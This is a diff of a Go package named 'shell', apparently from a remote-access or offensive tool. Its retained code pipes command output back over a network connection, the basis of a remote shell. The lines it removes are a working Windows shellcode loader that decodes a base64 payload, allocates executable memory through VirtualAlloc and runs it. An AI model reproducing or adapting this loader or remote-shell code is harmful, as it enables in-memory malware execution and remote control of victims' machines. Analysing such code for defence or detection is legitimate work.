@@ -3,17 +3,8 @@
 package shell
 
 import (
-	"encoding/base64"
 	"net"
 	"os/exec"
-	"syscall"
-	"unsafe"
-)
-
-const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 func GetShell() *exec.Cmd {
@@ -29,27 +20,4 @@ func ExecuteCmd(command string, conn net.Conn) {
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
-}
-
-func InjectShellcode(encShellcode string) {
-	if encShellcode != "" {
-		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
-			go ExecShellcode(shellcode)
-		}
-	}
-}
-
-func ExecShellcode(shellcode []byte) {
-	// Resolve kernell32.dll, and VirtualAlloc
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
-	// Reserve space to drop shellcode
-	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	// Ugly, but works
-	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
-	// Copy shellcode
-	for i, value := range shellcode {
-		addrPtr[i] = value
-	}
-	go syscall.Syscall(address, 0, 0, 0, 0)
 }
